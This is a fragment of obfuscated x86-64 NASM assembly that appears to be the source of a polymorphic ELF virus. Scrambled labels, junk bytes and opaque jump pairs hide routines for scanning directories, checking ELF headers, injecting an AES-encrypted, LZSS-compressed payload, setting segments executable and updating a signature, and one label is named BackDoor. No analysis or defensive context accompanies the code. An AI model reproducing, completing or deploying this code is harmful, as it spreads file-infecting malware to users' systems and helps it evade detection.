..@avYLoZPI2nIh:
    push        rsi
    jmp         $+5
db 0x5b, 0x47, 0x0e
    jmp         $+4
db 0x21, 0x67
    js          ..@jH9oswpI0EGo
    jns         ..@jH9oswpI0EGo
..@VttLMgEd3WAH:
    pop         rdx
    jb          ..@YFPVhp5tft7R
    jae         ..@YFPVhp5tft7R
..@9DDSQeabGxVU:
    mov         rbx, rbx
    js          ..@5HAMbR3agmIx
    jns         ..@5HAMbR3agmIx
..@nRDLF9YKNb4u:
    movdqu      xmm1, oWORD [rsp]
    jmp         ..@WbGFnBTVooiA
..@5u3NeQfwMFHO:
    cmp         BYTE [r1+4], ELFCLASS
    jb          ..@n1Qbt27odbBP
    jae         ..@n1Qbt27odbBP
..@AcurL9t0DFCw:
    ret
    jb          UpdateSignature
    jae         UpdateSignature
BackDoor:
    jmp         ..@wLQyLANATe5O
..@q4ixv4R5PQyA:
    push        rdx
    jmp         $+4
db 0xfe, 0x3c
    jmp         $+3
db 0xdb
    jmp         $+4
db 0xbc, 0xd5
    jmp         ..@9wUqndErVEng
..@n9SkVdckh70J:
    add         r2, 1
    jmp         $+3
db 0x9f
    jmp         $+4
db 0xc1, 0x95
    jmp         ..@Cnw5FeuSCxA2
..@mUeoB5XRYXRk:
    jl          ..@pNPTFSmxvxEF
    jmp         $+5
db 0x2a, 0xb0, 0x28
    jmp         ..@FKzBiIv0umXN
..@OCyLovbPV557:
    pop         rsi
    jb          ..@ZwYQEyD5WahR
    jae         ..@ZwYQEyD5WahR
..@WjhBl4kXl5dU:
    cmp         r3, 0x00
    jmp         $+4
db 0xb6, 0x5f
    jb          ..@8OIk6V6v5gr2
    jae         ..@8OIk6V6v5gr2
..@MuWiGhpmcLtp:
    test        rax, rax
    jb          ..@9OoAWUsM2GOG
    jae         ..@9OoAWUsM2GOG
..@CxyFkBDJ5AKa:
    mov         dx, WORD [rsp] 
    jmp         ..@PEV8tk6WbZps
..@ZCHvQKyVkUk7:
    push        rsi
    je          ..@Z0vrjClZuITO
    jne         ..@Z0vrjClZuITO
..@NZOpSZAUOtKB:
    xchg        rcx, rcx
    jmp         $+3
db 0xd0
    jmp         $+4
db 0x9c, 0x57
    jl          ..@nqhL3RQh3nUm
    jge         ..@nqhL3RQh3nUm
..@wCv8shobRqPv:
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    jmp         $+4
db 0x82, 0x85
    jmp         $+4
db 0xfa, 0x9b
    jmp         $+4
db 0xd8, 0x98
    jl          ..@Xuh0odoKhtXa
    jge         ..@Xuh0odoKhtXa
..@ZUpD1YIMjeeI:
    je          ..@hgDoGSPPBir0
    js          ..@NQ18RfnYWraG
    jns         ..@NQ18RfnYWraG
..@ExBkDfQLFHyE:
    shl         edx, POSITION_BITS+LENGTH_BITS
    jmp         $+4
db 0x9d, 0x83
    jmp         $+4
db 0x34, 0x23
    js          ..@0ui5zz4ko2J6
    jns         ..@0ui5zz4ko2J6
..@QOzlSNFcVAem:
    push        rax
    jmp         $+3
db 0x62
    jmp         ..@3fo5JsBHqY6F
..@AdlG6jdL3Rpd:
    mov         r1, m6
    jmp         $+4
db 0xf4, 0xd9
    jl          ..@k1kI90mZK85K
    jge         ..@k1kI90mZK85K
..@74DhweE13ffF:
    add         rsp, _DYNPIE_OFF_size
    jb          ..@43jcOPIWUWBO
    jae         ..@43jcOPIWUWBO
..@KFd8D4irXJwp:
    xchg        rcx, rcx
    jmp         $+4
db 0xb0, 0x93
    jl          ..@m9BeiZfsM4ss
    jge         ..@m9BeiZfsM4ss
..@mBd36MvGrRpf:
    aesenc      xmm0, xmm1
    jmp         $+4
db 0x89, 0x99
    js          ..@jCM26cGWN6QU
    jns         ..@jCM26cGWN6QU
..@aBBAekTEMCBM:
    push        rdi
    jmp         ..@ACrUM1cD443F
..@SdZA8XNjHDkV:
    jz          ..@vLasp30cQQ4e
    jmp         $+5
db 0x7b, 0xf8, 0x85
    jmp         $+3
db 0x68
    js          ..@Tks4ZcCDoqxY
    jns         ..@Tks4ZcCDoqxY
..@4P2K30ofBJUH:
    CFILE       [rsp+_INFDIR_OFF.dirfd]
    jmp         $+5
db 0xea, 0xa9, 0xcd
    jmp         ..@ehhlBHEFgGYi
..@VbaSRLuwyXTI:
    mov         QWORD [rsp+_VADDR_OFF.tmp_offset], 0
    jmp         $+4
db 0x3e, 0xa0
    jl          ..@DmXJg2iSdkKw
    jge         ..@DmXJg2iSdkKw
..@sWmELSJkucJQ:
    pop         rdi
    jmp         $+4
db 0x65, 0x20
    jb          NonBinaryFile
    jae         NonBinaryFile
..@l05c70saXi1B:
    pop         rdi
    jb          ..@mHLiFfKyo1bZ
    jae         ..@mHLiFfKyo1bZ
..@MTPKHxDtSiM9:
    xchg        rdi, rdi
    jmp         $+3
db 0x33
    je          ..@hIYGkmcsF8KT
    jne         ..@hIYGkmcsF8KT
..@BZywhbUVORZw:
    push        rbx
    jmp         ..@S6WDNFH0p2ag
..@NbPZQhCTTTrD:
    pop         rax
    jmp         $+5
db 0x9b, 0x88, 0xb1
    jmp         ..@Z4J4Iio5dFMc
..@l1tF0xCwhBIl:
%ifdef X86_64
    syscall
%endif
    jb          ..@Qcml7iMPkRTd
    jae         ..@Qcml7iMPkRTd
..@mBUuWb4kZ1tL:
%ifdef X86_32
    xchg        rsp, rsp
%endif
    jmp         $+3
db 0xf3
    jmp         ..@OCIameI0Zeel
..@SLQwyCvmHvVO:
    pop         rbx
    jmp         $+5
db 0xe7, 0x2e, 0xd5
    jl          ..@Xh3gpgpsK66j
    jge         ..@Xh3gpgpsK66j
..@WSP0fw0T7bp1:
    xchg        rax, rax
    jmp         $+4
db 0x1e, 0x69
    jb          ..@avYLoZPI2nIh
    jae         ..@avYLoZPI2nIh
..@f84MHlTdUdBe:
    xor         r3, r3
    jmp         $+5
db 0xd8, 0xfe, 0xfc
    js          ..@OVKcryDDkcnu
    jns         ..@OVKcryDDkcnu
..@Mnhq8dccixH8:
    mul         rbx
    jmp         $+4
db 0x06, 0x21
    jl          ..@vguW7zVfYFKZ
    jge         ..@vguW7zVfYFKZ
..@djrXPitlhEls:
    pop         rdi
    jmp         $+5
db 0xd4, 0x27, 0x3b
    jb          ..@gO2GCxcoU9tJ
    jae         ..@gO2GCxcoU9tJ
..@vEaIdtrUc706:
    xor         r1, r1
    jmp         ..@auAJ2T9VRRQ2
..@XqD04fCc4I7u:
    jz          ..@Y1QvwAiRXzke
    jmp         $+5
db 0x92, 0x2a, 0xde
    js          ..@17XweaKqbi44
    jns         ..@17XweaKqbi44
..@WpVCjlFwDme3:
%ifdef X86_32
    xor         ebx, ebx
%endif
    js          ..@GJvDW2ZksPEb
    jns         ..@GJvDW2ZksPEb
..@TZBgL4tKYlTx:
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    js          ..@AKQagrU50Auz
    jns         ..@AKQagrU50Auz
..@ccZ9frYfABZW:
    mov         rbp, rbp
    js          ..@9akrOBkamkmi
    jns         ..@9akrOBkamkmi
..@MmNSku9S44To:
    xchg        rdi, rdi
    jmp         $+4
db 0x07, 0xdc
    jl          ..@yQ528mOfVQEB
    jge         ..@yQ528mOfVQEB
..@3gKtpFqU4Zzl:
    pop         rax
    jmp         $+4
db 0xd4, 0xc4
    je          ..@LIHEDDPLVJ2w
    jne         ..@LIHEDDPLVJ2w
..@Qar6aoI950s4:
    push        rsi
    jmp         $+5
db 0x34, 0x00, 0xe0
    jmp         $+3
db 0x91
    jmp         ..@JmMzbJBbGdWk
..@xCMzjLk5c2Hp:
    rep         nop
    jl          ..@Fe8iy8dhtSDH
    jge         ..@Fe8iy8dhtSDH
..@wkEvSkHd18dV:
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    jmp         $+3
db 0xd7
    jmp         $+3
db 0x4f
    jmp         $+5
db 0xba, 0xb1, 0x01
    jmp         ..@LYWFcxQY0Sz1
..@oqMU5axGPPwk:
    jz          ..@U547FsTXM2g6
    jmp         $+5
db 0xec, 0xdd, 0x66
    jmp         ..@tgbGj8jCtFjG
..@jJPHvksB0rn1:
    rep         nop
    jmp         $+5
db 0xd6, 0x0e, 0x19
    jb          ..@VraYx6EUr92o
    jae         ..@VraYx6EUr92o
..@64ujVFgBPkmV:
    pop         rdx
    jmp         $+3
db 0x79
    jb          ..@Mwj2w3QLberv
    jae         ..@Mwj2w3QLberv
..@HJyZWzY4kyVg:
    aesenc      xmm0, xmm1
    jmp         $+4
db 0xb4, 0x26
    js          ..@3DT7ReGiiwzt
    jns         ..@3DT7ReGiiwzt
..@TpIBH4J0pW4I:
    push        rax
    jmp         $+4
db 0xd7, 0x6f
    jmp         $+3
db 0x50
    jmp         $+3
db 0x8b
    jmp         ..@BkPx7GljGyUu
..@0ooSt3eIyOiD:
    push        rsi
    js          ..@C8DiHx8p02qd
    jns         ..@C8DiHx8p02qd
..@rrebUXi9WkYY:
    mov         rsi, QWORD [rsp+_AESE_OFF.startaddr]
    jb          ..@KTBRnsK6aqxD
    jae         ..@KTBRnsK6aqxD
..@ZCvpjoZ8EGPE:
%ifdef X86_64
    xor         rax, rax
%endif
    js          ..@c7IPtlyhZGQi
    jns         ..@c7IPtlyhZGQi
..@wSR4nPXM153W:
    mov         rdx, rdx
    jb          ..@FVirR3ALDxvN
    jae         ..@FVirR3ALDxvN
..@yQ528mOfVQEB:
    push        rsi
    jmp         $+3
db 0x93
    js          ..@UC5cPkFjUcBE
    jns         ..@UC5cPkFjUcBE
..@zK6ak41vUC3W:
    push        rsi
    jmp         $+5
db 0x1b, 0xc7, 0xfb
    jmp         ..@ousofLZ1KkOI
..@m5AJ5XTUWVPh:
    mov         DWORD [r2+p_h.p_flags], PF_R + PF_X
    jmp         $+4
db 0x7f, 0x71
    jl          ..@rapm7Rbqkzfw
    jge         ..@rapm7Rbqkzfw
..@gppamhlvpXeI:
    add         rdi, key-_start
    jmp         ..@cb6scVRAmz4K
..@B7lk9e4VoM6a:
%ifdef X86_32
    xchg        rax, rax
%endif
    jmp         $+3
db 0xda
    jmp         ..@yOYW1BFNcLW1
..@hWWTjzwUJ6N1:
    mov         rsi, rsi
    jmp         $+3
db 0x83
    jmp         $+4
db 0xc0, 0x84
    jb          ..@AqlBYlvjxPfE
    jae         ..@AqlBYlvjxPfE
..@aWf2JACc4BGC:
    jne         ..@hgDoGSPPBir0
    jmp         $+4
db 0x83, 0xca
    jmp         $+3
db 0x89
    je          ..@jWfxW9hczfC2
    jne         ..@jWfxW9hczfC2
..@cwb9MP36p5k4:
%ifdef X86_64
    xor         r9, r9
%endif
    jmp         $+3
db 0xf5
    jmp         ..@eptMXIbomPL8
..@5UaStCm29ERn:
    push        rcx
    jmp         ..@wUIteOR0j9e8
..@9IawNLe9vrYQ:
%ifdef X86_64
    mov         rsi, rsi
%endif
    jmp         $+5
db 0xad, 0x1e, 0xa3
    jmp         ..@XAgbYY9aIqty
..@fa2iwOTtBHfW:
    pop         rdx
    jl          ..@V99fsisaewSG
    jge         ..@V99fsisaewSG
..@HLOFsYwhIhTK:
    push        rbx
    jmp         $+4
db 0xea, 0x92
    jmp         $+5
db 0x58, 0x38, 0x6b
    je          ..@1impi4bHYvg5
    jne         ..@1impi4bHYvg5
..@TBfsQBZNVJw2:
    sub         rsp, _PAYLOAD_OFF_size
    jmp         ..@Q4wsvDfojBKs
..@CpztpskN7ePk:
    xchg        rcx, rcx
    jmp         $+5
db 0x40, 0xf4, 0xd3
    jmp         $+4
db 0xd1, 0x82
    jl          ..@UqtCv89tDI7G
    jge         ..@UqtCv89tDI7G
..@UwQqBwbJXmp6:
    push        rsi
    jb          ..@NAdeGXxiRLXa
    jae         ..@NAdeGXxiRLXa
..@L7OLySj5spfG:
    xchg        rax, rax
    jmp         ..@AXC5oVep9zZ2
..@j6IvKK3SoKrq:
    mov         rax, SYS_FTRUNCATE
    js          ..@3bX4PZxezNah
    jns         ..@3bX4PZxezNah
..@UqtCv89tDI7G:
    mov         ecx, (WINDOW_LENGTH+LOOKAHEAD_LENGTH)
    jl          ..@d0Lua9UkxTdk
    jge         ..@d0Lua9UkxTdk
..@F3qYOVu5nCNm:
    sub         ax, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         $+4
db 0xcd, 0x7c
    jb          ..@Ekq7htLhMLuq
    jae         ..@Ekq7htLhMLuq
..@ZNq4dWYSebwS:
    push        rbx
    jmp         $+4
db 0x04, 0x53
    jl          ..@4xCYkV5odblt
    jge         ..@4xCYkV5odblt
..@6vg9pQqaam4I:
    mov         rbp, rbp
    jmp         $+3
db 0x71
    jmp         ..@YL0Q8uAJ3xHX
..@B8w6R73tCpKR:
    xchg        rdx, rdx
    jmp         $+5
db 0x94, 0x81, 0x52
    jmp         $+5
db 0xf1, 0xba, 0xa0
    jmp         $+4
db 0x78, 0xf8
    jmp         ..@pNbWx2TWp9AA
..@gQNGKfKMo1az:
    xchg        rdx, rdx
    jmp         $+4
db 0xb0, 0x9e
    jmp         ..@1J7SLBLVn1e6
..@IG3n4vzu5VAu:
    mov         r1, r5
    js          ..@euJviYGDFsGY
    jns         ..@euJviYGDFsGY
..@tH8DKPHpXvAq:
    mov         BYTE [r1], 0x00
    jmp         $+4
db 0x85, 0x4f
    jmp         ..@KEBKcmAAB98Z
..@XjikLJuE8JPD:
    push        rsi
    jmp         ..@AZQ9O81QoN9g
..@6vsrQsL5w2FA:
    pop         rdi
    jmp         $+5
db 0x1e, 0x38, 0x40
    jb          ..@MLJxElFOvt0j
    jae         ..@MLJxElFOvt0j
..@YnSQy5ko6FB9:
    xchg        rsp, rsp
    jmp         $+5
db 0x00, 0xf7, 0x3c
    jmp         $+4
db 0x48, 0xd8
    jmp         $+3
db 0x48
    jl          ..@J4fHDj233N1p
    jge         ..@J4fHDj233N1p
..@sLKDvtmaFMqW:
    lea         r2, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         ..@GIBitIMmzYVF
..@6xDSSx5OMyE0:
    mov         r2, rsp
    jmp         $+3
db 0xf5
    jmp         $+3
db 0x83
    js          ..@Ijg9vg0nOmdV
    jns         ..@Ijg9vg0nOmdV
..@C3En2TpEKnRI:
    push        r2
    jmp         $+5
db 0xd1, 0xc6, 0x0a
    jmp         $+4
db 0x9a, 0xf0
    jl          ..@DaXJ8rE90jG6
    jge         ..@DaXJ8rE90jG6
..@OITjpTLr29cP:
    mov         rsp, rsp
    jmp         $+5
db 0x23, 0x3b, 0x62
    jmp         $+3
db 0x52
    jb          ..@1uDobcxtJKOY
    jae         ..@1uDobcxtJKOY
..@5QHSC3N75wpP:
    mov         r1, rax
    js          ..@DTDpDyu58TzW
    jns         ..@DTDpDyu58TzW
..@PAVBuJdabG5Y:
    xchg        rdi, rdi
    jmp         $+3
db 0x58
    jl          ..@C95izOy4MoWD
    jge         ..@C95izOy4MoWD
..@GuWIh8qm4zMg:
    sub         ebx, 1
    jmp         $+4
db 0x36, 0x1b
    jmp         ..@CzwJ4HBKBfcq
..@QTvdNK1u3TxL:
    mov         rbp, rbp
    jb          ..@xgF05kxS18np
    jae         ..@xgF05kxS18np
..@ZZ3gvmph2CRn:
    cmp         eax, 0x03
    jl          ..@QaypfaawA8KP
    jge         ..@QaypfaawA8KP
..@9PA2vtrV8xNl:
    xor         r2, r2
    jb          ..@jy6OMAFxrpZM
    jae         ..@jy6OMAFxrpZM
..@I3nHUbGrdmNp:
    push        rdx
    jmp         $+5
db 0x86, 0x46, 0x0f
    js          ..@4Hi3cSYQ35dR
    jns         ..@4Hi3cSYQ35dR
..@nqXil7rZTv1t:
%ifdef X86_64
    xchg        rdx, rdx
%endif
    jmp         ..@q43qFnMahb1C
..@RbV8BkJLaCZW:
    pop         rbx
    jl          ..@dl4gpgDPIm6V
    jge         ..@dl4gpgDPIm6V
..@ruT8TsPExY8N:
    test        al, al
    jmp         $+4
db 0xb5, 0xa4
    jmp         $+3
db 0xec
    jmp         ..@pdKRe82FTbo0
..@NJBKnzQ3kA01:
    push        rbp
    jmp         ..@QTvdNK1u3TxL
..@qEpmy4yE5jWX:
    xor         r1, r1
    jl          ..@LmOyWjna0Wdb
    jge         ..@LmOyWjna0Wdb
..@dbQ2gh7zt6Pg:
    push        rax
    jmp         $+5
db 0xcb, 0x61, 0x42
    jmp         ..@JWnDXEm9XQ9U
..@wiGSBrSiLBr7:
    mov         r2, r1
    jl          ..@nqFYmG05ETHU
    jge         ..@nqFYmG05ETHU
..@2f6WFucsB0UF:
    mov         rbx, 0x1000
    jmp         ..@aS8Riywjm9np
..@ilFi29CU6Iis:
    mov         rax, rax
    jmp         $+3
db 0x5b
    jl          ..@q5hjZh9JoXhH
    jge         ..@q5hjZh9JoXhH
..@PAwTmg7Pw9Hi:
    xor         rax, rax
    jmp         $+3
db 0xeb
    js          ..@eSzEGINkAawo
    jns         ..@eSzEGINkAawo
..@6NnXPb3yTVY9:
    mov         eax, ebx
    jmp         ..@yVmdIZu7sqfL
..@41TzU5jnQoEO:
    push        rdi
    js          ..@IOqZOSlZDouF
    jns         ..@IOqZOSlZDouF
..@cckoSjrMvkSn:
    add         WORD [rsp+_LZSSE_OFF.la_index], ax
    jl          ..@RGMt6lmcdTcQ
    jge         ..@RGMt6lmcdTcQ
..@9giCm4dYTdlz:
    mov         rbx, rbx
    jmp         $+5
db 0x51, 0xde, 0x08
    jmp         $+5
db 0x2b, 0x92, 0x32
    jmp         ..@p52j8eEf9AdB
..@vwEQchLRDdP3:
%ifdef X86_32
    mov         eax, SYS_MMAP2
%endif
    jmp         $+5
db 0xfd, 0xd1, 0x12
    jmp         $+3
db 0xac
    js          ..@8yZGXh07mwDt
    jns         ..@8yZGXh07mwDt
..@2FQe15UiIxfS:
    jl          ..@kMf7hRKR42kQ
    jmp         $+4
db 0xf6, 0x3d
    jmp         ..@5mlfrWgK1dsN
..@QMxLddgSK3BY:
    pop         rsi
    jl          ..@BxCG2eiDkSIM
    jge         ..@BxCG2eiDkSIM
..@CYwfRyJX2DGX:
    mov         QWORD [rsp+_INFDIR_OFF.dirname], r1
    jmp         $+5
db 0x07, 0xe0, 0x43
    jmp         $+4
db 0x84, 0x11
    jmp         $+5
db 0x75, 0x3e, 0x5b
    jmp         $+5
db 0xed, 0xec, 0x3a
    jb          ..@QujqfTLzN31H
    jae         ..@QujqfTLzN31H
..@jgCIGFJRL4AS:
%ifdef X86_32
    push        rsi
%endif
    js          ..@iExUY32VQb1R
    jns         ..@iExUY32VQb1R
..@rWMFCZ5Y7qmA:
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr] 
    jmp         ..@f316IYTgUszI
..@SIdCitWAqhLb:
    mov         r5, rax
    jmp         $+5
db 0x7d, 0x53, 0x63
    jmp         $+3
db 0xc4
    jmp         ..@MKvl8VBbmmnU
..@96eUwEyRkEuD:
    rep         nop
    jmp         ..@HzXB26RWCbdC
..@Klp8kQDo6gu4:
    pop         rax
    jb          ..@uurowmh1UbIt
    jae         ..@uurowmh1UbIt
..@eZDPmbidE1UG:
    xchg        rbx, rbx
    jl          ..@kprLlaYDcE1B
    jge         ..@kprLlaYDcE1B
..@DVRJs27eOKK4:
    xor         rax, rax
    jmp         $+5
db 0xcc, 0x1f, 0x33
    js          ..@qE26EBI8qEHS
    jns         ..@qE26EBI8qEHS
..@GC4FkZSQM2I4:
    call        Strcpy
    jmp         $+3
db 0x24
    js          ..@XAfLJR6MzQds
    jns         ..@XAfLJR6MzQds
..@i0Z0PpJNX71P:
    push        rbx
    jmp         ..@lwyYHJn4iveO
..@1LUgCcmn0aq0:
    rep         nop
    jl          ..@QmNHItAHDexP
    jge         ..@QmNHItAHDexP
..@nqFYmG05ETHU:
    xchg        rbx, rbx
    jmp         $+5
db 0xa2, 0x8f, 0x71
    je          ..@VDYTx9MrscJ3
    jne         ..@VDYTx9MrscJ3
..@7ZwOk9NE9OK7:
    ret
    jb          MemMove
    jae         MemMove
..@v87sn041A4Oe:
    cmp         rax, 0x00
    jmp         $+3
db 0x03
    jmp         $+4
db 0x1b, 0x70
    jl          ..@XnDGssS4OXwi
    jge         ..@XnDGssS4OXwi
..@f4LUaDvFOv0E:
    OFILE       QWORD [r2], 0x02
    jmp         ..@RFEfcAp0u2dd
..@zJarJd1VVDl7:
    mov         rax, 1
    jl          ..@vMozNFIPod8Y
    jge         ..@vMozNFIPod8Y
..@2jPiKoTfsRTr:
    mov         rbp, rbp
    jmp         ..@cYPKUbSo14fu
..@yuHEzTPRc2J0:
    mov         WORD [rsp+_PAYLOAD_OFF.index], r2w
    jmp         $+5
db 0xed, 0x96, 0x64
    jmp         ..@DrNgAHjaKfRD
..@8NQB15QyJrPP:
    pop         r3
    jmp         $+4
db 0xc0, 0xd7
    jb          ..@I6m2uTSwW9Wt
    jae         ..@I6m2uTSwW9Wt
..@ogXDmZMO1xly:
    pop         rcx
    jmp         $+4
db 0x38, 0x19
    js          ..@Ud7lGl5I3IYm
    jns         ..@Ud7lGl5I3IYm
..@pvxMot34v5MC:
    pop         rdi
    jmp         ..@MAKHRHpNUaPj
UnmapFile:
    jmp         ..@DIW0bxfOGqaF
..@76oJAzVWjFzm:
    pop         rdi
    jmp         $+4
db 0xde, 0xc2
    jmp         $+3
db 0xfe
    jmp         $+4
db 0x07, 0x7a
    jb          ..@lcmXv8KDFvOd
    jae         ..@lcmXv8KDFvOd
..@eGmnIB2vxWdz:
    mov         r1, r5
    jb          ..@K27XwW5bkpM3
    jae         ..@K27XwW5bkpM3
..@saNew321CcRV:
    push        rsi
    jb          ..@OCyLovbPV557
    jae         ..@OCyLovbPV557
..@YcPLZAQvMn5V:
    xor         rax, rax
    je          ..@k4dcvMyrFtgw
    jne         ..@k4dcvMyrFtgw
..@mINklGBCR7em:
    mov         rsp, rsp
    jmp         $+4
db 0x22, 0x3f
    jl          ..@IcYOG88M4qq0
    jge         ..@IcYOG88M4qq0
..@djPABNbuxaCn:
    syscall
    js          ..@d2nowUxE8BqZ
    jns         ..@d2nowUxE8BqZ
..@OCIameI0Zeel:
%ifdef X86_32
    mov         esi, 0x22
%endif
    jmp         $+5
db 0x39, 0x25, 0x2f
    jmp         ..@MR6AQQABZc53
..@ApJOWecePGOB:
%ifdef X86_32
    mov         edx, 11b
%endif
    jmp         ..@C6AxBntWAL99
..@WklSuw24mww2:
    rep         nop
    js          ..@aJVX3FpfFXdp
    jns         ..@aJVX3FpfFXdp
..@wndsvVOXklxe:
    jne         ..@nEGVxD9XNTD7
    js          ..@aAKimYy1ypSi
    jns         ..@aAKimYy1ypSi
..@CbHfeKnEHLeT:
    push        rax
    jmp         $+4
db 0x0a, 0xc9
    jmp         ..@HqWlQCC2uepC
..@1pEE23xxdEti:
    pop         rbx
    jmp         $+5
db 0xe4, 0x7e, 0xdf
    jmp         ..@6Lg9ncNrtffL
..@MXhqUC9vPrfr:
    xor         rdx, rdx
    jb          ..@3061efJyA0pe
    jae         ..@3061efJyA0pe
..@TeiFNOqcmRve:
    mov         r2, rsp
    jmp         $+5
db 0x9c, 0xa4, 0x9e
    jb          ..@fIZ90XOqWWKp
    jae         ..@fIZ90XOqWWKp
..@WiXMGsS3BUEu:
    pop         rcx
    jmp         $+3
db 0x87
    jmp         ..@qiDYKeRLVFY2
..@qiDYKeRLVFY2:
    call        MapFile
    jmp         $+4
db 0x2e, 0x24
    js          ..@oBaMurGRXnlo
    jns         ..@oBaMurGRXnlo
..@jcTNDUMOZKVL:
    xchg        rax, rax
    jl          ..@95cuwtdW2akl
    jge         ..@95cuwtdW2akl
..@ZmyFxGTgojWR:
    pop         r5
    jmp         $+3
db 0x4c
    jb          ..@eKpuoCTjQoOn
    jae         ..@eKpuoCTjQoOn
..@QaypfaawA8KP:
    jl          ..@ehhlBHEFgGYi
    jmp         $+4
db 0x16, 0xdd
    js          ..@FQlHGbHnALT3
    jns         ..@FQlHGbHnALT3
..@oB7kSzdY8DMs:
    xchg        rbx, rbx
    jmp         ..@JWcg1RrNBEco
..@vXl3IEEWBPEN:
    pop         rdi
    jmp         ..@3fgIudWuVEyU
..@O2wzmf8Lhn51:
    add         r1, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    js          ..@Y3So29mZJF0o
    jns         ..@Y3So29mZJF0o
..@fu9d8PSXOiIx:
    lea         r1, QWORD [rsp+_INFFILE_OFF.file]
    jl          ..@D55cQYoIMHDy
    jge         ..@D55cQYoIMHDy
..@MAf2apW9aSOX:
    ret
    js          GetNewProgramVaddr
    jns         GetNewProgramVaddr
..@2ZnmOuKongPB:
    push        rsi
    jmp         $+3
db 0x1b
    jmp         $+5
db 0x7f, 0x03, 0x7b
    jb          ..@KjOXFN8XJnzi
    jae         ..@KjOXFN8XJnzi
..@0o7n39dI5O9G:
    xor         r2, r2
    jmp         $+3
db 0xe9
    jmp         $+4
db 0x85, 0xef
    jl          ..@2iXzuxkiiJN8
    jge         ..@2iXzuxkiiJN8
..@FETJcAj8ZiRh:
    mov         rdi, rdi
    jl          ..@TQoqFgT88wff
    jge         ..@TQoqFgT88wff
..@1impi4bHYvg5:
    pop         rbx
    jmp         $+4
db 0xa2, 0xe8
    jmp         $+4
db 0xe6, 0xbf
    jmp         $+4
db 0xbc, 0x49
    jl          ..@7Ihh78aORwbI
    jge         ..@7Ihh78aORwbI
..@QoDI77Wo2pH5:
%ifdef X86_64
    mov         edx, 11b
%endif
    jmp         ..@sqigGh1xI9RE
..@WfyZUFcK3K0J:
%ifdef X86_64
    mov         r8, 0xffffffffffffffff
%endif
    jmp         $+4
db 0x53, 0xa2
    jl          ..@1zGH6gTgeiU6
    jge         ..@1zGH6gTgeiU6
..@yeW0J8Bjhk6v:
    mov         rcx, rcx
    jmp         $+3
db 0xd7
    jl          ..@KFJP2KEkxK79
    jge         ..@KFJP2KEkxK79
..@EmD99nsqjf6A:
    mov         eax, 0x0
    jmp         $+3
db 0x01
    je          ..@6beHUmiNCCEJ
    jne         ..@6beHUmiNCCEJ
..@eW7ebXkKAkm6:
    pop         rdi
    jmp         $+4
db 0xa4, 0x10
    jmp         $+4
db 0x36, 0x30
    jl          ..@q7t9bpdkltuJ
    jge         ..@q7t9bpdkltuJ
..@HEeAqbgPEFTm:
    aesenc      xmm0, xmm1
    je          ..@9qOm1wwgZJJ4
    jne         ..@9qOm1wwgZJJ4
..@CkkW2SeuFUkF:
    mov         rbp, rbp
    jl          ..@yEPftwKUP828
    jge         ..@yEPftwKUP828
..@zKMSL6hN7rAc:
    xor         rax, rax
    jmp         $+5
db 0x2b, 0xb7, 0x4d
    jl          ..@2fJ5zhmoKBFN
    jge         ..@2fJ5zhmoKBFN
..@vYOqRNZBK4x1:
    mov         rbp, rbp
    jmp         $+3
db 0x25
    jmp         ..@WZ9Y8sxWwaIn
..@C1i7uRYNRtzg:
%ifdef X86_64
    mov         rax, rax
%endif
    jmp         ..@8WizTwe3SOHy
..@hYL3MRUlnRWF:
    aesenc      xmm0, xmm1
    jmp         $+5
db 0x77, 0xb3, 0xc8
    jmp         $+5
db 0xf1, 0xa5, 0x3e
    js          ..@oksHuU2x9q0Q
    jns         ..@oksHuU2x9q0Q
..@s0G49CJzKmQR:
    add         QWORD [rsp+_INFDIR_OFF.dirindex], rax
    jl          ..@9UGAjsRPt6Fa
    jge         ..@9UGAjsRPt6Fa
..@JMJYG258xURZ:
    mov         rdx, rdx
    jmp         $+3
db 0xe2
    jl          ..@EqqDoOzXWbUm
    jge         ..@EqqDoOzXWbUm
..@S62Xh7bVPxmn:
    xor         rax, rax
    jmp         $+3
db 0x90
    jmp         ..@ZwKJS9OtDQQu
..@ycd1UO3ZmK0y:
    mov         r3, non_packed_len
    js          ..@NN6QHtqTK1GX
    jns         ..@NN6QHtqTK1GX
..@cH50iUuGPKht:
    sub         r3, PADDING
    jmp         $+5
db 0x12, 0xb1, 0x41
    jmp         $+3
db 0xc4
    jb          ..@vugq9mjZP91g
    jae         ..@vugq9mjZP91g
..@lbeT4lHSxtZt:
    xchg        rsi, rsi
    jmp         $+5
db 0x07, 0x8b, 0xf9
    jmp         ..@vxiO5Vy5lIzP
..@ccQcSDbx2BTx:
    push        r1
    jb          ..@FhQ6oSsd8ylp
    jae         ..@FhQ6oSsd8ylp
..@tzrCrGZ7KL9C:
    pop         r4
    jmp         $+3
db 0xe5
    jb          ..@mb6HlcAIRVJh
    jae         ..@mb6HlcAIRVJh
..@6U1HmAjQdLJO:
    mov         r2, QWORD [r5+file.fileptr]
    jmp         $+5
db 0xb5, 0xaf, 0x05
    je          ..@jFfmghrhEjjN
    jne         ..@jFfmghrhEjjN
..@nS7oIvTdehMU:
    pop         rbx
    jmp         $+4
db 0xd3, 0x1d
    jmp         $+4
db 0xb3, 0xf8
    je          ..@pJdxMI4s1j9b
    jne         ..@pJdxMI4s1j9b
..@bfteJigreMQu:
%ifdef X86_64
    mov         rcx, rdx
%endif
    jmp         $+5
db 0x32, 0xce, 0x05
    jl          ..@HLguscHUFApy
    jge         ..@HLguscHUFApy
..@T6oTH03AibTz:
    push        rax
    jmp         $+5
db 0x64, 0x9a, 0x0b
    jmp         $+4
db 0x81, 0xad
    jmp         ..@ZpgeKVdHcfy6
..@HyUWwBQvl2dT:
    xchg        rdx, rdx
    jmp         ..@S9mw8k0hBiTB
..@7b9pm03sGTv3:
    push        rax
    jb          ..@0Lf94gvwjwGM
    jae         ..@0Lf94gvwjwGM
..@0cSdexMeMgAq:
    mov         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH*2
    jmp         $+5
db 0x34, 0x11, 0xf7
    jmp         $+3
db 0x29
    js          ..@sFmwgYBe8dHl
    jns         ..@sFmwgYBe8dHl
..@oLeDQ8kpkmQ7:
    sub         r2, 1
    jmp         ..@GND3L3k9PPNn
..@R9nb7PYJPWSP:
    push        r5
    jmp         ..@77M8PLdZvAHr
